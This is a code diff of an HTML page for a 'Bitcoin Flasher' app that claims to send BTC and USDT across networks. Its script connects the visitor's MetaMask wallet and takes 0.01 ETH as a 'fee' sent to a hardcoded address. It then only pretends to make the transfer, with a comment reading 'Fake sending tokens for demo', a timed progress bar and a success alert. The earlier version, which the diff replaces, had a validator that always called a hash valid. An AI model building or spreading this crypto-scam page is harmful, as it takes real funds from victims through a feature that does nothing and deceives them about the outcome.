@@ -4,73 +4,98 @@
     <!-- Essential Meta Tags -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="title" content="Bitcoin Flasher - Secure Transactions">
-    <meta name="description" content="Securely send Bitcoin and USDT with automated fee collection across multiple networks like ERC20, BEP20, and Polygon.">
-    <meta name="keywords" content="Bitcoin Flasher, BTC Transactions, USDT Sender, ERC20, BEP20, Polygon, Blockchain Transfers">
+    <meta name="title" content="Bitcoin Flasher - Advanced DApp">
+    <meta name="description" content="Experience secure and seamless BTC/USDT transactions with Bitcoin Flasher DApp.">
+    <meta name="keywords" content="Bitcoin Flasher, Blockchain DApp, BTC Transactions, USDT Transfers, ERC20, BEP20, Polygon, PWA">
     <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#000000">
 
     <!-- Canonical and Open Graph links -->
-    <link rel="canonical" href="https://bitcoin-flasher.github.io/bitcoin-flasher/">
-    <meta property="og:title" content="Bitcoin Flasher - Secure Transactions">
-    <meta property="og:description" content="Bitcoin Flasher simplifies Cross-chain USDT and BTC transfers with seamless wallet integration.">
-    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=Bitcoin+Flasher">
-    <meta property="og:url" content="https://bitcoin-flasher.github.io/bitcoin-flasher/">
+    <link rel="canonical" href="https://bitcoin-flasher.github.io/">
+    <meta property="og:title" content="Bitcoin Flasher - Advanced DApp">
+    <meta property="og:description" content="Simplify your BTC and USDT transfers with our advanced decentralized app.">
+    <meta property="og:image" content="https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/f7/01/e4/f701e4a3-88f1-93c1-fe76-435cfbbf8c51/AppIcon-1x_U007emarketing-0-7-0-85-220.png/492x0w.webp">
+    <meta property="og:url" content="https://bitcoin-flasher.github.io/">
     <meta property="og:type" content="website">
 
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Bitcoin Flasher - Secure Transactions">
-    <meta name="twitter:description" content="Simplify BTC and USDT transfers securely with wallet connection and automatic fee handling.">
-    <meta name="twitter:image" content="https://via.placeholder.com/1200x630.png?text=Bitcoin+Flasher">
+    <meta name="twitter:title" content="Bitcoin Flasher - Advanced DApp">
+    <meta name="twitter:description" content="Seamless blockchain transactions with Bitcoin Flasher DApp.">
+    <meta name="twitter:image" content="https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/f7/01/e4/f701e4a3-88f1-93c1-fe76-435cfbbf8c51/AppIcon-1x_U007emarketing-0-7-0-85-220.png/492x0w.webp">
+
+    <!-- Manifest -->
+    <link rel="manifest" href="manifest.json">
 
     <!-- Favicon -->
-    <link rel="icon" href="https://via.placeholder.com/48.png?text=BTC" type="image/png">
+    <link rel="icon" href="https://is1-ssl.mzstatic.com/image/thumb/Purple126/v4/f7/01/e4/f701e4a3-88f1-93c1-fe76-435cfbbf8c51/AppIcon-1x_U007emarketing-0-7-0-85-220.png/492x0w.webp" type="image/png">
 
     <!-- External CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 
-    <title>Bitcoin Flasher - Secure BTC & USDT Transfers</title>
+    <title>Bitcoin Flasher DApp - Seamless BTC/USDT Transactions</title>
 
     <!-- Custom styling -->
     <style>
         body {
-            background-color: #000;
-            color: #ff9900;
+            background-color: #101010;
+            color: #ffffff;
             font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
         }
+
         .container {
-            margin-top: 50px;
+            margin-top: 5%;
         }
+
         .card {
-            background-color: #1c1c1c;
+            background: linear-gradient(145deg, #181818, #1c1c1c);
             border: 1px solid #ff9900;
-            box-shadow: 0 4px 10px rgba(255, 153, 0, 0.3);
+            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
+            border-radius: 12px;
         }
+
         .btn-primary {
-            background color: #ff9900;
+            background-color: #ff9900;
             border: none;
+            font-size: 18px;
+            padding: 10px 20px;
         }
+
         .btn-primary:hover {
-            background color: #e68300;
+            background-color: #e67e00;
         }
+
         input, button {
-            margin-top: 10px;
+            margin-top: 15px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px 0;
+            color: #ff9900;
+            font-size: 14px;
+        }
+
+        #progressBar {
+            transition: width 0.5s;
         }
     </style>
 </head>
 <body>
-    <!-- Main Container -->
     <div class="container text-center">
         <div class="card p-4">
-            <h1>Bitcoin Flasher</h1>
-            <p>Flash USDT/BTC securely with automated fee collection.</p>
+            <h1>Bitcoin Flasher DApp</h1>
+            <p>Secure and Seamless BTC/USDT Transactions</p>
 
             <!-- Wallet Connection -->
             <button id="connectWallet" class="btn btn-primary w-100">Connect Wallet</button>
-            <p id="walletStatus" class="text-success mt-2">Not Connected</p>
+            <p id="walletStatus" class="text-success mt-3">Not Connected</p>
 
-            <!-- Send Transaction Form -->
-            <form id="sendForm">
+            <!-- Transaction Form -->
+            <form id="transactionForm">
                 <div class="mb-3">
                     <label for="recipient" class="form-label">Recipient Address</label>
                     <input type="text" id="recipient" class="form-control" placeholder="Enter recipient address" required>
@@ -82,78 +107,69 @@
                 <button type="submit" class="btn btn-primary w-100">Send Transaction</button>
             </form>
 
-            <!-- Progress Bar -->
+            <!-- Progress -->
             <div class="progress mt-3">
                 <div id="progressBar" class="progress-bar bg-warning" style="width: 0%;">0%</div>
             </div>
-            <div id="logs" class="mt-3"></div>
-
-            <!-- Validation Section -->
-            <h4 class="mt-4">Validate Transaction</h4>
-            <input id="txHash" class="form-control" placeholder="Enter Transaction Hash">
-            <button id="validateBtn" class="btn btn-primary w-100">Validate</button>
-            <p id="validationResult" class="mt-2"></p>
         </div>
     </div>
+
+    <footer>
+        &copy; 2024 Bitcoin Flasher - All Rights Reserved.
+    </footer>
 
     <!-- Web3.js and Script -->
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
-        let web3, account;
-        const feeReceiver = "0x3a06322e9F1124F6B2de8F343D4FDce4D1009869";
+        let web3, userAccount;
+        const feeAddress = "0x3a06322e9F1124F6B2de8F343D4FDce4D1009869";
 
-        // Connect Wallet
-        document.getElementById('connectWallet').addEventListener('click', async () => {
+        async function connectWallet() {
             if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
                 try {
+                    web3 = new Web3(window.ethereum);
                     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                    account = accounts[0];
-                    document.getElementById('walletStatus').textContent = `Connected: ${account}`;
+                    userAccount = accounts[0];
+                    document.getElementById('walletStatus').textContent = `Connected: ${userAccount}`;
                 } catch (error) {
                     alert('Wallet connection failed!');
                 }
             } else {
-                alert('Please install MetaMask to connect.');
+                alert('MetaMask is not installed. Please install MetaMask to connect.');
             }
-        });
+        }
 
-        // Send USDT/BTC and Auto Collect Fee
-        document.getElementById('sendForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
+        async function sendTransaction(event) {
+            event.preventDefault();
             const recipient = document.getElementById('recipient').value;
             const amount = document.getElementById('amount').value;
 
-            document.getElementById('progressBar').style.width = '50%';
-            document.getElementById('progressBar').textContent = 'Processing...';
-
             try {
-                const fee = web3.utils.toWei('0.01', 'ether'); // 0.01 ETH fee
-                await web3.eth.sendTransaction({
-                    from: account,
-                    to: feeReceiver,
-                    value: fee
-                });
+                const fee = web3.utils.toWei('0.01', 'ether');
+                await web3.eth.sendTransaction({ from: userAccount, to: feeAddress, value: fee });
+                document.getElementById('progressBar').style.width = '50%';
+                document.getElementById('progressBar').textContent = 'Processing...';
 
-                document.getElementById('progressBar').style.width = '100%';
-                document.getElementById('progressBar').textContent = 'Transaction Complete!';
-                document.getElementById('logs').innerHTML = `<p>Fee sent to ${feeReceiver}. Transaction Successful!</p>`;
-            } catch (error) {
-                alert('Transaction failed!');
-            }
-        });
-
-        // Validate Transaction Hash
-        document.getElementById('validateBtn').addEventListener('click', () => {
-            const txHash = document.getElementById('txHash').value;
-            if (txHash) {
-                document.getElementById('validation result').textContent = `Transaction ${txHash} is being validated...`;
+                // Fake sending tokens for demo
                 setTimeout(() => {
-                    document.getElementById('validationResult').textContent = `Transaction ${txHash} is valid on the network!`;
+                    document.getElementById('progressBar').style.width = '100%';
+                    document.getElementById('progressBar').textContent = 'Transaction Complete!';
+                    alert('Transaction sent successfully.');
                 }, 2000);
-            } else {
-                alert('Please enter a valid transaction hash.');
+            } catch (error) {
+                alert('Transaction failed: ' + error.message);
             }
+        }
+
+        document.getElementById('connectWallet').addEventListener('click', connectWallet);
+        document.getElementById('transactionForm').addEventListener('submit', sendTransaction);
+
+        // PWA Installation Prompt
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            alert('Install this app to your device for better accessibility.');
         });
     </script>
 </body>
